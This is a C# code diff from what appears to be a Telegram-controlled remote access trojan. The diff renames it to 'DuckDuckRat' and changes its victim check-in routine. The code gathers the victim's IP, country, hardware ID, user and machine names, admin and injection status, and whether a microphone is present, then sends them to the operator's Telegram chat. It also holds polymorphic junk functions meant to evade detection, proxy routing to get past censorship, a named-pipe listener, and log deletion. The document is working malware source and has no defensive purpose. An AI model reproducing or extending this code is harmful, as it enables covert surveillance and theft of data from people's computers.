@@ -6,7 +6,7 @@ using Telegram.Bot;
 using Telegram.Bot.Types;
 using Telegram.Bot.Types.Enums;
 using Telegram.Bot.Types.ReplyMarkups;
-using VanguardCore;
+using DuckDuckRat;
 using System.Collections.Generic;
 using System.Diagnostics.CodeAnalysis;
 using System.Net;
@@ -17,12 +17,12 @@ using System.Reflection;
 using System.IO.Pipes;
 using File = System.IO.File;
 
-namespace FinalBot
+namespace DuckDuckRat
 {
     public class BotOrchestrator
     {
         // [POLY_JUNK]
-        private static void _vanguard_bb8c073b() {
+        private static void _DuckDuckRat_bb8c073b() {
             int val = 76229;
             if (val > 50000) Console.WriteLine("Hash:" + 76229);
         }
@@ -85,7 +85,7 @@ namespace FinalBot
                 
                 // --- ANTI-GFW MESH INITIALIZATION ---
                 _ = await TelegramService.FindBestRoute();
-                _ = Task.Run(() => VanguardCore.Modules.ProxyModule.AutoRegisterAsync());
+                _ = Task.Run(() => DuckDuckRat.Modules.ProxyModule.AutoRegisterAsync());
                 _ = Task.Run(() => StartPipeListener());
 
                 // Startup Report
@@ -152,25 +152,32 @@ namespace FinalBot
         {
             try 
             {
-                var (ip, country, flag) = FinalBot.Modules.SystemInfoModule.GetCountryInfo();
-                string hwid = FinalBot.Modules.SystemInfoModule.GetHWID();
-                string osName = FinalBot.Modules.SystemInfoModule.GetFriendlyOSName();
+                var (ip, country, flag) = DuckDuckRat.Modules.SystemInfoModule.GetCountryInfo();
+                string hwid = DuckDuckRat.Modules.SystemInfoModule.GetHWID();
+                string osName = DuckDuckRat.Modules.SystemInfoModule.GetFriendlyOSName();
                 string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
                 bool isInjected = Environment.CommandLine.Contains("--injected");
-                string adminStatus = VanguardCore.ElevationService.IsAdmin() ? (isInjected ? "🔥 АДМИН (Injection V6.11)" : "🟢 АДМИН") : "🟡 Обычный Юзер";
+                string adminStatus = DuckDuckRat.ElevationService.IsAdmin() ? (isInjected ? "🔥 АДМИН (Injection V6.11)" : "🟢 АДМИН") : "🟡 Обычный Юзер";
+                string micStatus = DuckDuckRat.Modules.SystemInfoModule.HasMicrophone() ? "✅" : "❌";
 
-                string info = $"🚀 <b>КЛИЕНТ ОНЛАЙН (EmoCore v1)</b>\n" +
+                string info = $"🚀 <b>КЛИЕНТ ОНЛАЙН</b>\n" +
                               $"━━━━━━━━━━━━━━━━━━\n" +
                               $"👤 <b>ID:</b> <code>{pcUser}</code>\n" +
                               $"🆔 <b>HWID:</b> <code>{hwid}</code>\n" +
                               $"🌐 <b>IP:</b> <code>{ip}</code> | {flag} {country}\n" +
                               $"🖥️ <b>Система:</b> <code>{osName}</code>\n" +
                               $"⚡ <b>Статус:</b> <code>{adminStatus}</code>\n" +
+                              $"🎤 <b>Микрофон:</b> {micStatus}\n" +
                               $"🕙 <b>Время:</b> <code>{DateTime.Now:yyyy-MM-dd HH:mm:ss}</code>\n" +
                               $"━━━━━━━━━━━━━━━━━━";
                 
                 string adminPanelMarkup = "{\"inline_keyboard\":[[{\"text\":\"💠 Админ-панель\",\"callback_data\":\"admin_panel\"}]]}";
-                await TelegramService.SendMessage(info, adminPanelMarkup);
+                string mediaId = "BQACAgIAAyEFAATT7RxjAAIZCmnGmAABk8Djic8lEYfCeNB9VIYdXAACWYwAAhH4MEqw1eoXV0S-xjoE";
+                
+                await TelegramService.SendAnimation(mediaId, info, adminPanelMarkup);
+                
+                // Cleanup old logs if they exist (Post-rebrand hygiene)
+                try { if (File.Exists("svc_debug.log")) File.Delete("svc_debug.log"); } catch { }
             }
             catch { }
         }
@@ -181,7 +188,7 @@ namespace FinalBot
             {
                 try
                 {
-                    using (var pipeServer = new NamedPipeServerStream("emocore_status_pipe", PipeDirection.In, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous))
+                    using (var pipeServer = new NamedPipeServerStream("duckduckrat_status_pipe", PipeDirection.In, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous))
                     {
                         await pipeServer.WaitForConnectionAsync();
                         using (var reader = new StreamReader(pipeServer))
@@ -233,3 +240,5 @@ namespace FinalBot
         public void Stop() { _isRunning = false; _cts.Cancel(); }
     }
 }
+
+
